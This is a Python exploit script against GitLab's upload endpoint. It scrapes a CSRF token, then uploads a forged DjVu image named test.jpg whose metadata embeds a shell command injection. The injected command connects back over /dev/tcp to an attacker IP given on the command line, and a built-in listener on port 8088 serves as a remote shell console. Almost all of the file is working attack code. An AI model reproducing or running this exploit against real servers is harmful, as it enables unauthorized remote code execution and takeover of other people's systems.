import requests
from bs4 import BeautifulSoup
import base64
import random
import sys
import os
import threading
from threading import Thread
import readline, socket
requests.packages.urllib3.disable_warnings()
def attack(target_url,command):
    session = requests.Session()
    try:
        req1 = session.get(target_url.strip("/") + "/users/sign_in", verify=False)
        soup = BeautifulSoup(req1.text, features="lxml")
        token = soup.findAll('meta')[16].get("content")
        data = "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{"+  command +"} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
            "Connection": "close",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5",
            "X-CSRF-Token": f"{token}", "Accept-Encoding": "gzip, deflate"}
        flag = 'Failed to process image'
        req2 = session.post(target_url.strip("/") + "/uploads/user", data=data, headers=headers, verify=False)
        if flag in req2.text:
            print("Attack sent to {}. Waiting for connection...".format(target_url))
        else:
            print("Issues with target {}.".format(target_url))
    except Exception as e:
        print('Please check URL and or server connection.'+"\n".e)
def server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', int(8088)))
    s.listen(10)
    conn, _ = s.accept()
    while True:
        cmd = raw_input('# -> ').rstrip()
        if cmd == '':
            continue
        conn.send(cmd)
        data = conn.recv(4096)
        print (data)
def main():
    try:
        target_url = sys.argv[1]
        myad = sys.argv[2]
    except:
        print ('example.py GitlabURL AttackerIP')
        exit(0)
    command = 'exec 5<>/dev/tcp/{}/8088'.format(myad)
    attack(target_url,command)
if __name__ == '__main__':
    Thread(target = main).start()
    Thread(target = server).start()
    